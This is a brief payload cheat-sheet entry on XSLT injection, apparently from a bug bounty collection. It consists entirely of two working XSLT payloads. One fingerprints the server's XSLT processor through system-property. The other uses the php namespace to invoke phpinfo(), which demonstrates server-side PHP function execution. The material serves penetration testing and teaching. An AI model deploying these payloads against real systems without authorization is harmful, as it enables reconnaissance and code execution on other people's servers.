## XSLT Injection

**Backend infos**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:text>xsl:vendor = </xsl:text><xsl:value-of select="system-property('xsl:vendor')"/><br/>
		<xsl:text>xsl:version = </xsl:text><xsl:value-of select="system-property('xsl:version')"/><br/>
	</body>
</html>
```

**Injecting in PHP**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:value-of name="bugbounty" select="php:function('phpinfo')"/>
	</body>
</html>
```

